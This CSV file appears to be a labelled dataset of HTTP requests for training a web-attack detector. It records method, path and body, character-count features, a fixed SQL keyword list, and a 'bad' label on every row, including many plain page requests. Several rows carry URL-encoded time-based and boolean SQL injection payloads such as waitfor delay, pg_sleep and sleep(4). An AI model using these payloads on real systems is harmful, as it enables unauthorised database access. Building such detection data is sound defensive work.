method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,/robots.txt,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/cart.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/product.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/AJAX/showxml.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/adminPan3l/wp-content/plugins/zingiri-web-shop,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/RateProduct-1.html,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/artists.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/product.php?pic=-1%20or%2089%3d0,,0,0,0,0,2,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/-1%20or%2037%3d0-2/,,0,0,0,0,2,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/BuyProduct-1/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/buy.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/Details/color-printer/3/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/RateProduct%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20-3.html,,2,1,1,0,5,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/?pp=12,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/redir.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/BuyProduct-2/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/doLogin,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/index.jsp,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/secured/newuser.php,signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=acUn3t1x&upass2=acUn3t1x&uphone=555-666-0606&urname=wtnckitw%22%3dsleep%284%29%3d%22&uuname=wtnckitw,0,2,0,1,2,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/BuyProduct-1/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/guestbook.php,name=1%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20,2,1,1,0,5,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/sendcommand.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/comment.php,comment=1&name=%3cyour%20name%20here%3e&phpaction=echo%2520%2524_POST%255bcomment%255d%253b&Submit=Submit,0,0,0,0,2,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/artists.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/Details/color-printer/3/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/BuyProduct-2/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/product.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/details.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/default.jsp,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/showimage.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/doLogin,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/AJAX/infoartist.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/BuyProduct-2/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/secured/phpinfo.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/adminPan3l/wp-config.php.001,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/guestbook.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/params.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/_mmServerScripts/MMHTTPDB.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/secured/phpinfo.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20,,3,0,1,0,5,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/comment.php?aid=1%27%3bselect%20pg_sleep%284%29%3b%20--%20,comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit,1,0,1,1,6,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/search.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/Details/color-printer%27%3dsleep%284%29%3d%27/1/,,2,0,0,1,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/Details/network-attached-storage-dlink,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/search.jsp,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/doSubscribe,btnSubmit=Subscribe%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&txtEmail=sample%40email.tst,2,1,1,0,5,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/params.php?aaaa/=1&p=1%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20,,0,1,1,2,6,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/cart.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/search.php?test=query,goButton=go%27%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&searchFor=1,3,0,1,0,5,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/index.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/AJAX/showxml.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/search.jsp,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/AJAX/infocateg.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/comment.php?pid=7%27%3dsleep%284%29%3d%27,,2,0,0,1,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/BuyProduct-1/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/comment.php?aid=,comment=1&name=%3cyour%20name%20here%3e%22%3b%20waitfor%20delay%20%270%3a0%3a4%27%20--%20&phpaction=echo $_POST[comment];&Submit=Submit,2,1,1,0,8,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/sendcommand.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/BuyProduct--1%20or%2060%3d0/,,0,0,1,0,2,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/Details/color-printer/3/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=sample%2540email.tst%20and%20sleep%284%29%20,0,0,0,1,3,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/-1%22%20or%20%2226%22%3d%2226-1/,,0,4,0,0,2,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/AJAX/infoartist.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/AJAX/showxml.php,-1 or 65-63 = 2,0,0,0,0,4,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/util/serverStatusCheckService.jsp?HostName=-1%22%20or%2060-58%20%3d%20%222,,0,2,0,0,4,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/adminPan3l/wp-content/plugins/wp-filebase,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/BuyProduct-1/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/search.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/BuyProduct-3/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/RateProduct-1.html,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/doLogin,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/BuyProduct-3/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/RateProduct-2.html,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/cart.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/_mmServerScripts/MMHTTPDB.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/secured/phpinfo.php?=-1%22%20or%20%2239%22%3d%2239,,0,4,0,0,2,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/sendFeedback,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/Details/color-printer/3/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/comment.php?aid=2,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/AJAX/infoartist.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/search.jsp,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/BuyProduct-2/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/sendFeedback,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/params.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/RateProduct-2.html,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/_mmServerScripts/MMHTTPDB.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/adminPan3l/wp-config.cs,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/adminPan3l/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/details.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/AJAX/infotitle.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=fwfvqiwg%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&subject=1&submit=Submit,1,0,1,2,8,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/artists.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/userinfo.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/params.php?aaaa%2f=1%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20,,1,0,1,2,6,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/Details/color-printer/3/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/RateProduct-1.html,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/secured/newuser.php,signup=1%27%20and%20%28sleep%284%29%2b1%29%20limit%201%20--%20,1,0,1,2,6,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/doLogin,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/params.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/comment.php?aid=1%27%3dsleep%284%29%3d%27,comment=1&name=<your name here>&phpaction=echo $_POST[comment];&Submit=Submit,2,0,0,1,3,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/userinfo.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/survey_questions.jsp,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/bxss/adminPan3l/wp-content/plugins/pretty-link,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/high_yield_investments%27%3bselect%20pg_sleep%284%29%3b%20--%20.htm,,1,0,1,1,3,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/RateProduct-3.html,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/product.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/product.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/product.php?pic=-1%20or%2078%3d0,,0,0,0,0,2,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/Details/color-printer/3/?id=-1%20or%20106%20%3d%20104,,0,0,0,0,4,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/sendFeedback,cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=fwfvqiwg&subject=1%27%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20&submit=Submit,1,0,1,2,8,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/AJAX/infotitle.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/index.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/comment.php?pid=7%27%3bselect%20pg_sleep%284%29%3b%20--%20,,1,0,1,1,3,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/details.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/comment.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/details.php?id=-1%20or%2063%3d63,,0,0,0,0,2,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/cart.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/Mod_Rewrite_Shop/Details/color-printer/3/,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/secured/newuser.php,signup=-1%22%20or%20%2239%22%3d%2239&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=acUn3t1x&upass2=acUn3t1x&uphone=555-666-0606&urname=wtnckitw&uuname=wtnckitw,0,4,0,0,4,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
POST,/doLogin,btnSubmit=Login&passw=acUn3t1x&uid=-1%22%20or%20%22107%22%3d%22107,0,4,0,0,2,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/redir.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/survey_questions.jsp,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/secured/newuser.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/hpp/index.php?pp=12%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20,,0,0,1,2,6,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
GET,/redir.php,,0,0,0,0,0,"['sleep', 'drop', 'uid', 'select', 'waitfor', 'delay', 'system', 'union', 'order by', 'group by']",bad
